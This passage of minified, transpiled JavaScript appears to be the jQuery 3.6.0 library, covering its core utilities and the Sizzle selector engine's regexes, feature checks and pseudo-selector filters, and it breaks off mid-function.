"use strict";
function _typeof(t) {
  return (_typeof =
    "function" == typeof Symbol && "symbol" == typeof Symbol.iterator
      ? function (t) {
          return typeof t;
        }
      : function (t) {
          return t &&
            "function" == typeof Symbol &&
            t.constructor === Symbol &&
            t !== Symbol.prototype
            ? "symbol"
            : typeof t;
        })(t);
}
!(function (t, e) {
  "object" == ("undefined" == typeof module ? "undefined" : _typeof(module)) &&
  "object" == _typeof(module.exports)
    ? (module.exports = t.document
        ? e(t, !0)
        : function (t) {
            if (!t.document)
              throw Error("jQuery requires a window with a document");
            return e(t);
          })
    : e(t);
})("undefined" != typeof window ? window : void 0, function (t, e) {
  var n = [],
    i = Object.getPrototypeOf,
    o = n.slice,
    s = n.flat
      ? function (t) {
          return n.flat.call(t);
        }
      : function (t) {
          return n.concat.apply([], t);
        },
    r = n.push,
    a = n.indexOf,
    l = {},
    c = l.toString,
    d = l.hasOwnProperty,
    u = d.toString,
    p = u.call(Object),
    f = {},
    h = function t(e) {
      return (
        "function" == typeof e &&
        "number" != typeof e.nodeType &&
        "function" != typeof e.item
      );
    },
    g = function t(e) {
      return null != e && e === e.window;
    },
    v = t.document,
    m = { type: !0, src: !0, nonce: !0, noModule: !0 };
  function y(t, e, n) {
    var i,
      o,
      s = (n = n || v).createElement("script");
    if (((s.text = t), e))
      for (i in m)
        (o = e[i] || (e.getAttribute && e.getAttribute(i))) &&
          s.setAttribute(i, o);
    n.head.appendChild(s).parentNode.removeChild(s);
  }
  function b(t) {
    return null == t
      ? t + ""
      : "object" == _typeof(t) || "function" == typeof t
      ? l[c.call(t)] || "object"
      : _typeof(t);
  }
  var x = function t(e, n) {
    return new t.fn.init(e, n);
  };
  function _(t) {
    var e = !!t && "length" in t && t.length,
      n = b(t);
    return (
      !h(t) &&
      !g(t) &&
      ("array" === n ||
        0 === e ||
        ("number" == typeof e && e > 0 && e - 1 in t))
    );
  }
  (x.fn = x.prototype =
    {
      jquery: "3.6.0",
      constructor: x,
      length: 0,
      toArray: function t() {
        return o.call(this);
      },
      get: function t(e) {
        return null == e
          ? o.call(this)
          : e < 0
          ? this[e + this.length]
          : this[e];
      },
      pushStack: function t(e) {
        var n = x.merge(this.constructor(), e);
        return (n.prevObject = this), n;
      },
      each: function t(e) {
        return x.each(this, e);
      },
      map: function t(e) {
        return this.pushStack(
          x.map(this, function (t, n) {
            return e.call(t, n, t);
          })
        );
      },
      slice: function t() {
        return this.pushStack(o.apply(this, arguments));
      },
      first: function t() {
        return this.eq(0);
      },
      last: function t() {
        return this.eq(-1);
      },
      even: function t() {
        return this.pushStack(
          x.grep(this, function (t, e) {
            return (e + 1) % 2;
          })
        );
      },
      odd: function t() {
        return this.pushStack(
          x.grep(this, function (t, e) {
            return e % 2;
          })
        );
      },
      eq: function t(e) {
        var n = this.length,
          i = +e + (e < 0 ? n : 0);
        return this.pushStack(i >= 0 && i < n ? [this[i]] : []);
      },
      end: function t() {
        return this.prevObject || this.constructor();
      },
      push: r,
      sort: n.sort,
      splice: n.splice,
    }),
    (x.extend = x.fn.extend =
      function () {
        var t,
          e,
          n,
          i,
          o,
          s,
          r = arguments[0] || {},
          a = 1,
          l = arguments.length,
          c = !1;
        for (
          "boolean" == typeof r && ((c = r), (r = arguments[a] || {}), a++),
            "object" == _typeof(r) || h(r) || (r = {}),
            a === l && ((r = this), a--);
          a < l;
          a++
        )
          if (null != (t = arguments[a]))
            for (e in t)
              (i = t[e]),
                "__proto__" !== e &&
                  r !== i &&
                  (c && i && (x.isPlainObject(i) || (o = Array.isArray(i)))
                    ? ((n = r[e]),
                      (s =
                        o && !Array.isArray(n)
                          ? []
                          : o || x.isPlainObject(n)
                          ? n
                          : {}),
                      (o = !1),
                      (r[e] = x.extend(c, s, i)))
                    : void 0 !== i && (r[e] = i));
        return r;
      }),
    x.extend({
      expando: "jQuery" + ("3.6.0" + Math.random()).replace(/\D/g, ""),
      isReady: !0,
      error: function t(e) {
        throw Error(e);
      },
      noop: function t() {},
      isPlainObject: function t(e) {
        var n, o;
        return (
          !(!e || "[object Object]" !== c.call(e)) &&
          (!(n = i(e)) ||
            ("function" ==
              typeof (o = d.call(n, "constructor") && n.constructor) &&
              u.call(o) === p))
        );
      },
      isEmptyObject: function t(e) {
        var n;
        for (n in e) return !1;
        return !0;
      },
      globalEval: function t(e, n, i) {
        y(e, { nonce: n && n.nonce }, i);
      },
      each: function t(e, n) {
        var i,
          o = 0;
        if (_(e))
          for (i = e.length; o < i && !1 !== n.call(e[o], o, e[o]); o++);
        else for (o in e) if (!1 === n.call(e[o], o, e[o])) break;
        return e;
      },
      makeArray: function t(e, n) {
        var i = n || [];
        return (
          null != e &&
            (_(Object(e))
              ? x.merge(i, "string" == typeof e ? [e] : e)
              : r.call(i, e)),
          i
        );
      },
      inArray: function t(e, n, i) {
        return null == n ? -1 : a.call(n, e, i);
      },
      merge: function t(e, n) {
        for (var i = +n.length, o = 0, s = e.length; o < i; o++) e[s++] = n[o];
        return (e.length = s), e;
      },
      grep: function t(e, n, i) {
        for (var o = [], s = 0, r = e.length, a = !i; s < r; s++)
          !n(e[s], s) !== a && o.push(e[s]);
        return o;
      },
      map: function t(e, n, i) {
        var o,
          r,
          a = 0,
          l = [];
        if (_(e))
          for (o = e.length; a < o; a++)
            null != (r = n(e[a], a, i)) && l.push(r);
        else for (a in e) null != (r = n(e[a], a, i)) && l.push(r);
        return s(l);
      },
      guid: 1,
      support: f,
    }),
    "function" == typeof Symbol && (x.fn[Symbol.iterator] = n[Symbol.iterator]),
    x.each(
      "Boolean Number String Function Array Date RegExp Object Error Symbol".split(
        " "
      ),
      function (t, e) {
        l["[object " + e + "]"] = e.toLowerCase();
      }
    );
  var w = (function (t) {
    var e,
      n,
      i,
      o,
      s,
      r,
      a,
      l,
      c,
      d,
      u,
      p,
      f,
      h,
      g,
      v,
      m,
      y,
      b,
      x = "sizzle" + 1 * new Date(),
      _ = t.document,
      w = 0,
      T = 0,
      S = td(),
      C = td(),
      k = td(),
      A = td(),
      P = function t(e, n) {
        return e === n && (u = !0), 0;
      },
      E = {}.hasOwnProperty,
      L = [],
      D = L.pop,
      j = L.push,
      H = L.push,
      q = L.slice,
      O = function t(e, n) {
        for (var i = 0, o = e.length; i < o; i++) if (e[i] === n) return i;
        return -1;
      },
      N =
        "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
      z = "[\\x20\\t\\r\\n\\f]",
      I =
        "(?:\\\\[\\da-fA-F]{1,6}" +
        z +
        "?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+",
      F =
        "\\[" +
        z +
        "*(" +
        I +
        ")(?:" +
        z +
        "*([*^$|!~]?=)" +
        z +
        "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" +
        I +
        "))|)" +
        z +
        "*\\]",
      M =
        ":(" +
        I +
        ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" +
        F +
        ")*)|.*)\\)|)",
      R = RegExp(z + "+", "g"),
      B = RegExp("^" + z + "+|((?:^|[^\\\\])(?:\\\\.)*)" + z + "+$", "g"),
      W = RegExp("^" + z + "*," + z + "*"),
      X = RegExp("^" + z + "*([>+~]|" + z + ")" + z + "*"),
      Y = RegExp(z + "|>"),
      U = RegExp(M),
      V = RegExp("^" + I + "$"),
      G = {
        ID: RegExp("^#(" + I + ")"),
        CLASS: RegExp("^\\.(" + I + ")"),
        TAG: RegExp("^(" + I + "|[*])"),
        ATTR: RegExp("^" + F),
        PSEUDO: RegExp("^" + M),
        CHILD: RegExp(
          "^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" +
            z +
            "*(even|odd|(([+-]|)(\\d*)n|)" +
            z +
            "*(?:([+-]|)" +
            z +
            "*(\\d+)|))" +
            z +
            "*\\)|)",
          "i"
        ),
        bool: RegExp("^(?:" + N + ")$", "i"),
        needsContext: RegExp(
          "^" +
            z +
            "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" +
            z +
            "*((?:-\\d)?\\d*)" +
            z +
            "*\\)|)(?=[^-]|$)",
          "i"
        ),
      },
      K = /HTML$/i,
      Z = /^(?:input|select|textarea|button)$/i,
      J = /^h\d$/i,
      Q = /^[^{]+\{\s*\[native \w/,
      tt = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
      te = /[+~]/,
      tn = RegExp("\\\\[\\da-fA-F]{1,6}" + z + "?|\\\\([^\\r\\n\\f])", "g"),
      ti = function t(e, n) {
        var i = "0x" + e.slice(1) - 65536;
        return (
          n ||
          (i < 0
            ? String.fromCharCode(i + 65536)
            : String.fromCharCode((i >> 10) | 55296, (1023 & i) | 56320))
        );
      },
      to = /([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g,
      ts = function t(e, n) {
        return n
          ? "\0" === e
            ? "пїЅ"
            : e.slice(0, -1) +
              "\\" +
              e.charCodeAt(e.length - 1).toString(16) +
              " "
          : "\\" + e;
      },
      tr = function t() {
        p();
      },
      ta = t_(
        function (t) {
          return !0 === t.disabled && "fieldset" === t.nodeName.toLowerCase();
        },
        { dir: "parentNode", next: "legend" }
      );
    try {
      H.apply((L = q.call(_.childNodes)), _.childNodes),
        L[_.childNodes.length].nodeType;
    } catch (tl) {
      H = {
        apply: L.length
          ? function (t, e) {
              j.apply(t, q.call(e));
            }
          : function (t, e) {
              for (var n = t.length, i = 0; (t[n++] = e[i++]); );
              t.length = n - 1;
            },
      };
    }
    function tc(t, e, i, o) {
      var s,
        a,
        c,
        d,
        u,
        h,
        m,
        y = e && e.ownerDocument,
        _ = e ? e.nodeType : 9;
      if (
        ((i = i || []),
        "string" != typeof t || !t || (1 !== _ && 9 !== _ && 11 !== _))
      )
        return i;
      if (!o && (p(e), (e = e || f), g)) {
        if (11 !== _ && (u = tt.exec(t))) {
          if ((s = u[1])) {
            if (9 === _) {
              if (!(c = e.getElementById(s))) return i;
              if (c.id === s) return i.push(c), i;
            } else if (y && (c = y.getElementById(s)) && b(e, c) && c.id === s)
              return i.push(c), i;
          } else {
            if (u[2]) return H.apply(i, e.getElementsByTagName(t)), i;
            if (
              (s = u[3]) &&
              n.getElementsByClassName &&
              e.getElementsByClassName
            )
              return H.apply(i, e.getElementsByClassName(s)), i;
          }
        }
        if (
          n.qsa &&
          !A[t + " "] &&
          (!v || !v.test(t)) &&
          (1 !== _ || "object" !== e.nodeName.toLowerCase())
        ) {
          if (((m = t), (y = e), 1 === _ && (Y.test(t) || X.test(t)))) {
            for (
              ((y = (te.test(t) && t$(e.parentNode)) || e) === e && n.scope) ||
                ((d = e.getAttribute("id"))
                  ? (d = d.replace(to, ts))
                  : e.setAttribute("id", (d = x))),
                a = (h = r(t)).length;
              a--;

            )
              h[a] = (d ? "#" + d : ":scope") + " " + tx(h[a]);
            m = h.join(",");
          }
          try {
            return H.apply(i, y.querySelectorAll(m)), i;
          } catch (w) {
            A(t, !0);
          } finally {
            d === x && e.removeAttribute("id");
          }
        }
      }
      return l(t.replace(B, "$1"), e, i, o);
    }
    function td() {
      var t = [];
      return function e(n, o) {
        return (
          t.push(n + " ") > i.cacheLength && delete e[t.shift()],
          (e[n + " "] = o)
        );
      };
    }
    function tu(t) {
      return (t[x] = !0), t;
    }
    function tp(t) {
      var e = f.createElement("fieldset");
      try {
        return !!t(e);
      } catch (n) {
        return !1;
      } finally {
        e.parentNode && e.parentNode.removeChild(e), (e = null);
      }
    }
    function tf(t, e) {
      for (var n = t.split("|"), o = n.length; o--; ) i.attrHandle[n[o]] = e;
    }
    function th(t, e) {
      var n = e && t,
        i =
          n &&
          1 === t.nodeType &&
          1 === e.nodeType &&
          t.sourceIndex - e.sourceIndex;
      if (i) return i;
      if (n) {
        for (; (n = n.nextSibling); ) if (n === e) return -1;
      }
      return t ? 1 : -1;
    }
    function tg(t) {
      return function (e) {
        return "input" === e.nodeName.toLowerCase() && e.type === t;
      };
    }
    function tv(t) {
      return function (e) {
        var n = e.nodeName.toLowerCase();
        return ("input" === n || "button" === n) && e.type === t;
      };
    }
    function tm(t) {
      return function (e) {
        return "form" in e
          ? e.parentNode && !1 === e.disabled
            ? "label" in e
              ? "label" in e.parentNode
                ? e.parentNode.disabled === t
                : e.disabled === t
              : e.isDisabled === t || (!t !== e.isDisabled && ta(e) === t)
            : e.disabled === t
          : "label" in e && e.disabled === t;
      };
    }
    function ty(t) {
      return tu(function (e) {
        return (
          (e = +e),
          tu(function (n, i) {
            for (var o, s = t([], n.length, e), r = s.length; r--; )
              n[(o = s[r])] && (n[o] = !(i[o] = n[o]));
          })
        );
      });
    }
    function t$(t) {
      return t && void 0 !== t.getElementsByTagName && t;
    }
    for (e in ((n = tc.support = {}),
    (s = tc.isXML =
      function (t) {
        var e = t && t.namespaceURI,
          n = t && (t.ownerDocument || t).documentElement;
        return !K.test(e || (n && n.nodeName) || "HTML");
      }),
    (p = tc.setDocument =
      function (t) {
        var e,
          o,
          r = t ? t.ownerDocument || t : _;
        return (
          r != f &&
            9 === r.nodeType &&
            r.documentElement &&
            ((h = (f = r).documentElement),
            (g = !s(f)),
            _ != f &&
              (o = f.defaultView) &&
              o.top !== o &&
              (o.addEventListener
                ? o.addEventListener("unload", tr, !1)
                : o.attachEvent && o.attachEvent("onunload", tr)),
            (n.scope = tp(function (t) {
              return (
                h.appendChild(t).appendChild(f.createElement("div")),
                void 0 !== t.querySelectorAll &&
                  !t.querySelectorAll(":scope fieldset div").length
              );
            })),
            (n.attributes = tp(function (t) {
              return (t.className = "i"), !t.getAttribute("className");
            })),
            (n.getElementsByTagName = tp(function (t) {
              return (
                t.appendChild(f.createComment("")),
                !t.getElementsByTagName("*").length
              );
            })),
            (n.getElementsByClassName = Q.test(f.getElementsByClassName)),
            (n.getById = tp(function (t) {
              return (
                (h.appendChild(t).id = x),
                !f.getElementsByName || !f.getElementsByName(x).length
              );
            })),
            n.getById
              ? ((i.filter.ID = function (t) {
                  var e = t.replace(tn, ti);
                  return function (t) {
                    return t.getAttribute("id") === e;
                  };
                }),
                (i.find.ID = function (t, e) {
                  if (void 0 !== e.getElementById && g) {
                    var n = e.getElementById(t);
                    return n ? [n] : [];
                  }
                }))
              : ((i.filter.ID = function (t) {
                  var e = t.replace(tn, ti);
                  return function (t) {
                    var n =
                      void 0 !== t.getAttributeNode && t.getAttributeNode("id");
                    return n && n.value === e;
                  };
                }),
                (i.find.ID = function (t, e) {
                  if (void 0 !== e.getElementById && g) {
                    var n,
                      i,
                      o,
                      s = e.getElementById(t);
                    if (s) {
                      if ((n = s.getAttributeNode("id")) && n.value === t)
                        return [s];
                      for (o = e.getElementsByName(t), i = 0; (s = o[i++]); )
                        if ((n = s.getAttributeNode("id")) && n.value === t)
                          return [s];
                    }
                    return [];
                  }
                })),
            (i.find.TAG = n.getElementsByTagName
              ? function (t, e) {
                  return void 0 !== e.getElementsByTagName
                    ? e.getElementsByTagName(t)
                    : n.qsa
                    ? e.querySelectorAll(t)
                    : void 0;
                }
              : function (t, e) {
                  var n,
                    i = [],
                    o = 0,
                    s = e.getElementsByTagName(t);
                  if ("*" === t) {
                    for (; (n = s[o++]); ) 1 === n.nodeType && i.push(n);
                    return i;
                  }
                  return s;
                }),
            (i.find.CLASS =
              n.getElementsByClassName &&
              function (t, e) {
                if (void 0 !== e.getElementsByClassName && g)
                  return e.getElementsByClassName(t);
              }),
            (m = []),
            (v = []),
            (n.qsa = Q.test(f.querySelectorAll)) &&
              (tp(function (t) {
                var e;
                (h.appendChild(t).innerHTML =
                  "<a id='" +
                  x +
                  "'></a><select id='" +
                  x +
                  "-\r\\' msallowcapture=''><option selected=''></option></select>"),
                  t.querySelectorAll("[msallowcapture^='']").length &&
                    v.push("[*^$]=" + z + "*(?:''|\"\")"),
                  t.querySelectorAll("[selected]").length ||
                    v.push("\\[" + z + "*(?:value|" + N + ")"),
                  t.querySelectorAll("[id~=" + x + "-]").length || v.push("~="),
                  (e = f.createElement("input")).setAttribute("name", ""),
                  t.appendChild(e),
                  t.querySelectorAll("[name='']").length ||
                    v.push("\\[" + z + "*name" + z + "*=" + z + "*(?:''|\"\")"),
                  t.querySelectorAll(":checked").length || v.push(":checked"),
                  t.querySelectorAll("a#" + x + "+*").length ||
                    v.push(".#.+[+~]"),
                  t.querySelectorAll("\\\f"),
                  v.push("[\\r\\n\\f]");
              }),
              tp(function (t) {
                t.innerHTML =
                  "<a href='' disabled='disabled'></a><select disabled='disabled'><option/></select>";
                var e = f.createElement("input");
                e.setAttribute("type", "hidden"),
                  t.appendChild(e).setAttribute("name", "D"),
                  t.querySelectorAll("[name=d]").length &&
                    v.push("name" + z + "*[*^$|!~]?="),
                  2 !== t.querySelectorAll(":enabled").length &&
                    v.push(":enabled", ":disabled"),
                  (h.appendChild(t).disabled = !0),
                  2 !== t.querySelectorAll(":disabled").length &&
                    v.push(":enabled", ":disabled"),
                  t.querySelectorAll("*,:x"),
                  v.push(",.*:");
              })),
            (n.matchesSelector = Q.test(
              (y =
                h.matches ||
                h.webkitMatchesSelector ||
                h.mozMatchesSelector ||
                h.oMatchesSelector ||
                h.msMatchesSelector)
            )) &&
              tp(function (t) {
                (n.disconnectedMatch = y.call(t, "*")),
                  y.call(t, "[s!='']:x"),
                  m.push("!=", M);
              }),
            (v = v.length && RegExp(v.join("|"))),
            (m = m.length && RegExp(m.join("|"))),
            (b =
              (e = Q.test(h.compareDocumentPosition)) || Q.test(h.contains)
                ? function (t, e) {
                    var n = 9 === t.nodeType ? t.documentElement : t,
                      i = e && e.parentNode;
                    return (
                      t === i ||
                      !(
                        !i ||
                        1 !== i.nodeType ||
                        !(n.contains
                          ? n.contains(i)
                          : t.compareDocumentPosition &&
                            16 & t.compareDocumentPosition(i))
                      )
                    );
                  }
                : function (t, e) {
                    if (e) {
                      for (; (e = e.parentNode); ) if (e === t) return !0;
                    }
                    return !1;
                  }),
            (P = e
              ? function (t, e) {
                  if (t === e) return (u = !0), 0;
                  var i =
                    !t.compareDocumentPosition - !e.compareDocumentPosition;
                  return (
                    i ||
                    (1 &
                      (i =
                        (t.ownerDocument || t) == (e.ownerDocument || e)
                          ? t.compareDocumentPosition(e)
                          : 1) ||
                    (!n.sortDetached && e.compareDocumentPosition(t) === i)
                      ? t == f || (t.ownerDocument == _ && b(_, t))
                        ? -1
                        : e == f || (e.ownerDocument == _ && b(_, e))
                        ? 1
                        : d
                        ? O(d, t) - O(d, e)
                        : 0
                      : 4 & i
                      ? -1
                      : 1)
                  );
                }
              : function (t, e) {
                  if (t === e) return (u = !0), 0;
                  var n,
                    i = 0,
                    o = t.parentNode,
                    s = e.parentNode,
                    r = [t],
                    a = [e];
                  if (!o || !s)
                    return t == f
                      ? -1
                      : e == f
                      ? 1
                      : o
                      ? -1
                      : s
                      ? 1
                      : d
                      ? O(d, t) - O(d, e)
                      : 0;
                  if (o === s) return th(t, e);
                  for (n = t; (n = n.parentNode); ) r.unshift(n);
                  for (n = e; (n = n.parentNode); ) a.unshift(n);
                  for (; r[i] === a[i]; ) i++;
                  return i
                    ? th(r[i], a[i])
                    : r[i] == _
                    ? -1
                    : a[i] == _
                    ? 1
                    : 0;
                })),
          f
        );
      }),
    (tc.matches = function (t, e) {
      return tc(t, null, null, e);
    }),
    (tc.matchesSelector = function (t, e) {
      if (
        (p(t),
        n.matchesSelector &&
          g &&
          !A[e + " "] &&
          (!m || !m.test(e)) &&
          (!v || !v.test(e)))
      )
        try {
          var i = y.call(t, e);
          if (
            i ||
            n.disconnectedMatch ||
            (t.document && 11 !== t.document.nodeType)
          )
            return i;
        } catch (o) {
          A(e, !0);
        }
      return tc(e, f, null, [t]).length > 0;
    }),
    (tc.contains = function (t, e) {
      return (t.ownerDocument || t) != f && p(t), b(t, e);
    }),
    (tc.attr = function (t, e) {
      (t.ownerDocument || t) != f && p(t);
      var o = i.attrHandle[e.toLowerCase()],
        s = o && E.call(i.attrHandle, e.toLowerCase()) ? o(t, e, !g) : void 0;
      return void 0 !== s
        ? s
        : n.attributes || !g
        ? t.getAttribute(e)
        : (s = t.getAttributeNode(e)) && s.specified
        ? s.value
        : null;
    }),
    (tc.escape = function (t) {
      return (t + "").replace(to, ts);
    }),
    (tc.error = function (t) {
      throw Error("Syntax error, unrecognized expression: " + t);
    }),
    (tc.uniqueSort = function (t) {
      var e,
        i = [],
        o = 0,
        s = 0;
      if (
        ((u = !n.detectDuplicates),
        (d = !n.sortStable && t.slice(0)),
        t.sort(P),
        u)
      ) {
        for (; (e = t[s++]); ) e === t[s] && (o = i.push(s));
        for (; o--; ) t.splice(i[o], 1);
      }
      return (d = null), t;
    }),
    (o = tc.getText =
      function (t) {
        var e,
          n = "",
          i = 0,
          s = t.nodeType;
        if (s) {
          if (1 === s || 9 === s || 11 === s) {
            if ("string" == typeof t.textContent) return t.textContent;
            for (t = t.firstChild; t; t = t.nextSibling) n += o(t);
          } else if (3 === s || 4 === s) return t.nodeValue;
        } else for (; (e = t[i++]); ) n += o(e);
        return n;
      }),
    ((i = tc.selectors =
      {
        cacheLength: 50,
        createPseudo: tu,
        match: G,
        attrHandle: {},
        find: {},
        relative: {
          ">": { dir: "parentNode", first: !0 },
          " ": { dir: "parentNode" },
          "+": { dir: "previousSibling", first: !0 },
          "~": { dir: "previousSibling" },
        },
        preFilter: {
          ATTR: function t(e) {
            return (
              (e[1] = e[1].replace(tn, ti)),
              (e[3] = (e[3] || e[4] || e[5] || "").replace(tn, ti)),
              "~=" === e[2] && (e[3] = " " + e[3] + " "),
              e.slice(0, 4)
            );
          },
          CHILD: function t(e) {
            return (
              (e[1] = e[1].toLowerCase()),
              "nth" === e[1].slice(0, 3)
                ? (e[3] || tc.error(e[0]),
                  (e[4] = +(e[4]
                    ? e[5] + (e[6] || 1)
                    : 2 * ("even" === e[3] || "odd" === e[3]))),
                  (e[5] = +(e[7] + e[8] || "odd" === e[3])))
                : e[3] && tc.error(e[0]),
              e
            );
          },
          PSEUDO: function t(e) {
            var n,
              i = !e[6] && e[2];
            return G.CHILD.test(e[0])
              ? null
              : (e[3]
                  ? (e[2] = e[4] || e[5] || "")
                  : i &&
                    U.test(i) &&
                    (n = r(i, !0)) &&
                    (n = i.indexOf(")", i.length - n) - i.length) &&
                    ((e[0] = e[0].slice(0, n)), (e[2] = i.slice(0, n))),
                e.slice(0, 3));
          },
        },
        filter: {
          TAG: function t(e) {
            var n = e.replace(tn, ti).toLowerCase();
            return "*" === e
              ? function () {
                  return !0;
                }
              : function (t) {
                  return t.nodeName && t.nodeName.toLowerCase() === n;
                };
          },
          CLASS: function t(e) {
            var n = S[e + " "];
            return (
              n ||
              ((n = RegExp("(^|" + z + ")" + e + "(" + z + "|$)")),
              S(e, function (t) {
                return n.test(
                  ("string" == typeof t.className && t.className) ||
                    (void 0 !== t.getAttribute && t.getAttribute("class")) ||
                    ""
                );
              }))
            );
          },
          ATTR: function t(e, n, i) {
            return function (t) {
              var o = tc.attr(t, e);
              return null == o
                ? "!=" === n
                : !n ||
                    ((o += ""),
                    "=" === n
                      ? o === i
                      : "!=" === n
                      ? o !== i
                      : "^=" === n
                      ? i && 0 === o.indexOf(i)
                      : "*=" === n
                      ? i && o.indexOf(i) > -1
                      : "$=" === n
                      ? i && o.slice(-i.length) === i
                      : "~=" === n
                      ? (" " + o.replace(R, " ") + " ").indexOf(i) > -1
                      : "|=" === n &&
                        (o === i || o.slice(0, i.length + 1) === i + "-"));
            };
          },
          CHILD: function t(e, n, i, o, s) {
            var r = "nth" !== e.slice(0, 3),
              a = "last" !== e.slice(-4),
              l = "of-type" === n;
            return 1 === o && 0 === s
              ? function (t) {
                  return !!t.parentNode;
                }
              : function (t, n, i) {
                  var c,
                    d,
                    u,
                    p,
                    f,
                    h,
                    g = r !== a ? "nextSibling" : "previousSibling",
                    v = t.parentNode,
                    m = l && t.nodeName.toLowerCase(),
                    y = !i && !l,
                    b = !1;
                  if (v) {
                    if (r) {
                      for (; g; ) {
                        for (p = t; (p = p[g]); )
                          if (
                            l
                              ? p.nodeName.toLowerCase() === m
                              : 1 === p.nodeType
                          )
                            return !1;
                        h = g = "only" === e && !h && "nextSibling";
                      }
                      return !0;
                    }
                    if (((h = [a ? v.firstChild : v.lastChild]), a && y)) {
                      for (
                        b =
                          (f =
                            (c =
                              (d =
                                (u = (p = v)[x] || (p[x] = {}))[p.uniqueID] ||
                                (u[p.uniqueID] = {}))[e] || [])[0] === w &&
                            c[1]) && c[2],
                          p = f && v.childNodes[f];
                        (p = (++f && p && p[g]) || (b = f = 0) || h.pop());

                      )
                        if (1 === p.nodeType && ++b && p === t) {
                          d[e] = [w, f, b];
                          break;
                        }
                    } else if (
                      (y &&
                        (b = f =
                          (c =
                            (d =
                              (u = (p = t)[x] || (p[x] = {}))[p.uniqueID] ||
                              (u[p.uniqueID] = {}))[e] || [])[0] === w && c[1]),
                      !1 === b)
                    )
                      for (
                        ;
                        (p = (++f && p && p[g]) || (b = f = 0) || h.pop()) &&
                        ((l
                          ? p.nodeName.toLowerCase() !== m
                          : 1 !== p.nodeType) ||
                          !++b ||
                          (y &&
                            ((d =
                              (u = p[x] || (p[x] = {}))[p.uniqueID] ||
                              (u[p.uniqueID] = {}))[e] = [w, b]),
                          p !== t));

                      );
                    return (b -= s) === o || (b % o == 0 && b / o >= 0);
                  }
                };
          },
          PSEUDO: function t(e, n) {
            var o,
              s =
                i.pseudos[e] ||
                i.setFilters[e.toLowerCase()] ||
                tc.error("unsupported pseudo: " + e);
            return s[x]
              ? s(n)
              : s.length > 1
              ? ((o = [e, e, "", n]),
                i.setFilters.hasOwnProperty(e.toLowerCase())
                  ? tu(function (t, e) {
                      for (var i, o = s(t, n), r = o.length; r--; )
                        t[(i = O(t, o[r]))] = !(e[i] = o[r]);
                    })
                  : function (t) {
                      return s(t, 0, o);
                    })
              : s;
          },
        },
        pseudos: {
          not: tu(function (t) {
            var e = [],
              n = [],
              i = a(t.replace(B, "$1"));
            return i[x]
              ? tu(function (t, e, n, o) {
                  for (var s, r = i(t, null, o, []), a = t.length; a--; )
                    (s = r[a]) && (t[a] = !(e[a] = s));
                })
              : function (t, o, s) {
                  return (e[0] = t), i(e, null, s, n), (e[0] = null), !n.pop();
                };
          }),
          has: tu(function (t) {
            return function (e) {
              return tc(t, e).length > 0;
            };
          }),
          contains: tu(function (t) {
            return (
              (t = t.replace(tn, ti)),
              function (e) {
                return (e.textContent || o(e)).indexOf(t) > -1;
              }
            );
          }),
          lang: tu(function (t) {
            return (
              V.test(t || "") || tc.error("unsupported lang: " + t),
              (t = t.replace(tn, ti).toLowerCase()),
              function (e) {
                var n;
                do
                  if (
                    (n = g
                      ? e.lang
                      : e.getAttribute("xml:lang") || e.getAttribute("lang"))
                  )
                    return (
                      (n = n.toLowerCase()) === t || 0 === n.indexOf(t + "-")
                    );
                while ((e = e.parentNode) && 1 === e.nodeType);
                return !1;
              }
            );
          }),
          target: function e(n) {
            var i = t.location && t.location.hash;
            return i && i.slice(1) === n.id;
          },
          root: function t(e) {
            return e === h;
          },
          focus: function t(e) {
            return (
              e === f.activeElement &&
              (!f.hasFocus || f.hasFocus()) &&
              !!(e.type || e.href || ~e.tabIndex)
            );
          },
          enabled: tm(!1),
          disabled: tm(!0),
          checked: function t(e) {
            var n = e.nodeName.toLowerCase();
            return (
              ("input" === n && !!e.checked) || ("option" === n && !!e.selected)
            );
          },
          selected: function t(e) {
            return (
              e.parentNode && e.parentNode.selectedIndex, !0 === e.selected
            );
          },
          empty: function t(e) {
            for (e = e.firstChild; e; e = e.nextSibling)
              if (e.nodeType < 6) return !1;
            return !0;
          },
          parent: function t(e) {
            return !i.pseudos.empty(e);
          },
          header: function t(e) {
            return J.test(e.nodeName);
          },
          input: function t(e) {
            return Z.test(e.nodeName);
          },
          button: function t(e) {
            var n = e.nodeName.toLowerCase();
            return ("input" === n && "button" === e.type) || "button" === n;
          },
          text: function t(e) {
            var n;
            return (
              "input" === e.nodeName.toLowerCase() &&
              "text" === e.type &&
              (null == (n = e.getAttribute("type")) ||
                "text" === n.toLowerCase())
            );
          },
          first: ty(function () {
            return [0];
          }),
          last: ty(function (t, e) {
            return [e - 1];
          }),
          eq: ty(function (t, e, n) {
            return [n < 0 ? n + e : n];
          }),
          even: ty(function (t, e) {
            for (var n = 0; n < e; n += 2) t.push(n);
            return t;
          }),
          odd: ty(function (t, e) {
            for (var n = 1; n < e; n += 2) t.push(n);
            return t;
          }),
          lt: ty(function (t, e, n) {
            for (var i = n < 0 ? n + e : n > e ? e : n; --i >= 0; ) t.push(i);
            return t;
          }),
          gt: ty(function (t, e, n) {
            for (var i = n < 0 ? n + e : n; ++i < e; ) t.push(i);
            return t;
          }),
        },
      }).pseudos.nth = i.pseudos.eq),
    { radio: !0, checkbox: !0, file: !0, password: !0, image: !0 }))
      i.pseudos[e] = tg(e);
    for (e in { submit: !0, reset: !0 }) i.pseudos[e] = tv(e);
    function tb() {}
    function tx(t) {
      for (var e = 0, n = t.length, i = ""; e < n; e++) i += t[e].value;
      return i;
    }
    function t_(t, e, n) {
      var i = e.dir,
        o = e.next,
        s = o || i,
        r = n && "parentNode" === s,
        a = T++;
      return e.first
        ? function (e, n, o) {
            for (; (e = e[i]); ) if (1 === e.nodeType || r) return t(e, n, o);
            return !1;
          }
        : function (e, n, l) {
            var c,
              d,
              u,
              p = [w, a];
            if (l) {
              for (; (e = e[i]); )
                if ((1 === e.nodeType || r) && t(e, n, l)) return !0;
            } else
              for (; (e = e[i]); )
                if (1 === e.nodeType || r) {
                  if (
                    ((d =
